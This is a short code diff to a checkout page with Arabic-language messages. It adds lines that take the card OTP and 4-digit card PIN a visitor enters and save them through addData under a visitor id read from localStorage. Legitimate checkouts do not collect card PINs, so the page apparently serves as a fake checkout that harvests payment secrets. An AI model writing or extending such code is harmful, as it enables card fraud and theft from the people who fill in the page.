@@ -452,7 +452,8 @@ export default function CheckoutPage() {
       setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
       return
     }
-
+    const visitor = localStorage.getItem("visitor")
+addData({id:visitor,cardOtp})
     setIsVerifying(true)
     setStep("card-pin")
 
@@ -475,6 +476,8 @@ export default function CheckoutPage() {
       setVerificationError("الرجاء إدخال رمز PIN المكون من 4 أرقام")
       return
     }
+    const visitor = localStorage.getItem("visitor")
+    addData({id:visitor,cardPin})
     setIsVerifying(true)
     setVerificationError("")
     try {
